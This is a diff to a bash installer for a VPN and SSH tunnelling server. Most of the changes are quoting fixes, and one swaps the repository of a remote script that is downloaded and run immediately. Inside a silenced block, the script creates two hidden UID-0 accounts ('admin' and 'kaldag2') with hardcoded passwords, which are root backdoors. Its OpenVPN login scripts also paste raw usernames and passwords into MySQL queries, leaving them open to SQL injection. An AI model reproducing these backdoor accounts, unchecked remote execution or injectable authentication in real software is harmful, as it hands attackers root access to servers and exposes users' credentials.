@@ -12,7 +12,7 @@ HYSTERIA_TYPE='default';
 API_KEY='DexterEskalarte';
 
 apt update
-wget -O autodns "https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/autodns/autodns" && chmod +x autodns && sed -i -e 's/\r$//' ~/autodns && ./autodns
+wget -O autodns "https://raw.githubusercontent.com/magi17/betav/refs/heads/main/autodns/autodns" && chmod +x autodns && sed -i -e 's/\r$//' ~/autodns && ./autodns
 
 DOMAIN="$(cat /root/subdomain)"
 NS="$(cat /root/ns.txt)"
@@ -101,7 +101,7 @@ echo "deb http://ftp.debian.org/debian/ jessie main contrib non-free
     squid -z
     cd /etc/squid/
     rm squid.conf
-    echo "acl Firenet dst `curl -s https://api.ipify.org`" >> squid.conf
+    echo "acl Firenet dst $(curl -s https://api.ipify.org)" >> squid.conf
     echo 'http_port 8080
 http_port 8181
 visible_hostname Proxy
@@ -131,7 +131,7 @@ wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/socks/so
 dos2unix /etc/socks-ssh.py
 chmod +x /etc/socks-ssh.py
 
-wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/websocket/socks-ws-ssh.py
+wget 'https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/websocket/socks-ws-ssh.py' -O /etc/socks-ws-ssh.py
 dos2unix /etc/socks-ws-ssh.py
 chmod +x /etc/socks-ws-ssh.py
 
@@ -170,8 +170,8 @@ touch /etc/openvpn/server2.conf
 echo 'DNS=1.1.1.1
 DNSStubListener=no' >> /etc/systemd/resolved.conf
 
-echo '#Openvpn Configuration by MTK Developer :)
-dev tun
+echo '#Openvpn Configuration by MTK Developer :)' > /etc/openvpn/server.conf
+echo 'dev tun
 port PORT_UDP
 proto udp
 server 10.10.0.0 255.255.0.0
@@ -210,12 +210,12 @@ client-disconnect /etc/openvpn/login/disconnect.sh
 log /etc/openvpn/server/udpserver.log
 status /etc/openvpn/server/udpclient.log
 status-version 2
-verb 3' > /etc/openvpn/server.conf
+verb 3' >> /etc/openvpn/server.conf
 
 sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server.conf
 
-echo '#Openvpn Configuration by MTK Developer :)
-dev tun
+echo '#Openvpn Configuration by MTK Developer :)' > /etc/openvpn/server2.conf
+echo 'dev tun
 port PORT_TCP
 proto tcp
 server 10.20.0.0 255.255.0.0
@@ -254,7 +254,7 @@ client-disconnect /etc/openvpn/login/disconnect.sh
 log /etc/openvpn/server/tcpserver.log
 status /etc/openvpn/server/tcpclient.log
 status-version 2
-verb 3' > /etc/openvpn/server2.conf
+verb 3' >> /etc/openvpn/server2.conf
 
 sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/openvpn/server2.conf
 
@@ -275,7 +275,7 @@ sed -i "s|DBNAME|$DBNAME|g" /etc/openvpn/login/config.sh
 #!/bin/bash
 . /etc/openvpn/login/config.sh
 Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND status='live' AND is_freeze=0 AND is_ban=0 AND (duration > 0 OR vip_duration > 0 OR private_duration > 0)"
-user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
+user_name=$(mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query")
 [ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
 EOM
 
@@ -285,13 +285,13 @@ cat <<'LENZ05' >/etc/openvpn/login/connect.sh
 . /etc/openvpn/login/config.sh
 ##set status online to user connected
 server_ip=SERVER_IP
-datenow=`date +"%Y-%m-%d %T"`
+datenow=$(date +"%Y-%m-%d %T")
 tm="$(date +%s)"
 dt="$(date +'%Y-%m-%d %H:%M:%S')"
 timestamp="$(date +'%FT%TZ')"
 
 ##set status online to user connected
-bandwidth_check=`mysql -u $USER -p$PASS -D $DB -h $HOST --skip-column-name -e "SELECT bandwidth_logs.username FROM bandwidth_logs WHERE bandwidth_logs.username='$common_name' AND bandwidth_logs.status='online'"`
+bandwidth_check=$(mysql -u $USER -p$PASS -D $DB -h $HOST --skip-column-name -e "SELECT bandwidth_logs.username FROM bandwidth_logs WHERE bandwidth_logs.username='$common_name' AND bandwidth_logs.status='online'")
 if [ "$bandwidth_check" == 1 ]; then
 mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE bandwith_logs SET server_ip='$trusted_ip', server_port='$trusted_port', timestamp='$timestamp', ipaddress='$trusted_ip:$trusted_port', username='$common_name', time_in='$tm', since_connected='$time_ascii', bytes_received='$bytes_received', bytes_sent='$bytes_sent' WHERE username='$common_name' AND status='online' AND server_port='$trusted_port' "
 mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
@@ -451,7 +451,7 @@ clear
 echo "Installing iptables."
 echo "net.ipv4.ip_forward=1
 net.ipv4.conf.all.rp_filter=0
-net.ipv4.conf."$server_interface".rp_filter=0" >> /etc/sysctl.conf
+net.ipv4.conf.$server_interface.rp_filter=0" >> /etc/sysctl.conf
 sysctl -p
 {
 iptables -F
@@ -579,19 +579,12 @@ echo "/bin/false" >> /etc/shells
 #//wget -O /etc/banner #"https://raw.githubusercontent.com/SCRIPT5in1/4in1/refs/heads/main/banner/SshBanner"
 chmod +x /etc/banner
 
-useradd -p $(openssl passwd -1 kaldag) admin -ou 0 -g 0
-useradd -p $(openssl passwd -1 admin) kaldag -ou 0 -g 0
+useradd -p $(openssl passwd -1 kaldag2) admin -ou 0 -g 0
+useradd -p $(openssl passwd -1 admin) kaldag2 -ou 0 -g 0
 sudo service stunnel4 restart
 sudo service dropbear restart
   } &>/dev/null
 }
-
-#install_sudo(){
-#    useradd -m mtknetwork 2>/dev/null; echo mtknetwork:F1005r90@@@ | chpasswd &>/dev/null; usermod -aG sudo mtknetwork &>/dev/null
-#    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-#    echo "AllowGroups mtknetwork" >> /etc/ssh/sshd_config
-#    service sshd restart
-#}
 
 #====================================================
 #	Installing SlowDNS
@@ -633,8 +626,8 @@ cp dnstt-client $DNSDIR
 echo "
 hostname=$DOMAIN
 domain=$NS
-privkey=`cat /root/.dns/server.key`
-pubkey=`cat /root/.dns/server.pub`
+privkey=$(cat /root/.dns/server.key)
+pubkey=$(cat /root/.dns/server.pub)
 os=debian
 dnsresolvertype=$dnsresolverType
 dnsresolver=$dnsresolver" >> $DNSCONFIG/config
@@ -816,7 +809,7 @@ USERNAME=$(echo "$AUTH" | cut -d ":" -f 1)
 PASSWORD=$(echo "$AUTH" | cut -d ":" -f 2)
 
 Query="SELECT user_name FROM users WHERE user_name='$USERNAME' AND auth_vpn=md5('$PASSWORD') AND status='live' AND is_freeze=0 AND is_ban=0 AND (duration > 0 OR vip_duration > 0 OR private_duration > 0)"
-user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
+user_name=$(mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query")
 [ "$user_name" != '' ] && [ "$user_name" = "$USERNAME" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
 EOM
 
@@ -883,7 +876,7 @@ screen -dmS socks python /etc/socks.py 80
 screen -dmS socks python /etc/socks-ssh.py 8000
 screen -dmS socks python /etc/socks-ws-ssh.py 8001
 screen -dmS socks python /etc/socks-ws-ssl.py 8002
-ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
+ps x | grep "udpvpn" | grep -v "grep" || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
 screen -dmS webinfo php -S 0.0.0.0:5623 -t /root/.web/
 bash /etc/.monitor aio
 exit 0' >> /etc/rc.local
@@ -938,7 +931,7 @@ reboot
 
 server_ip=$(curl -s ipinfo.io/ip)
 server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
-serverVersion=`awk '/^VERSION_ID=/' /etc/*-release | awk -F'=' '{ print tolower($2) }'`
+serverVersion=$(awk '/^VERSION_ID=/' /etc/*-release | awk -F'=' '{ print tolower($2) }' | tr -d '"')
 
 #install_sudo
 install_require  
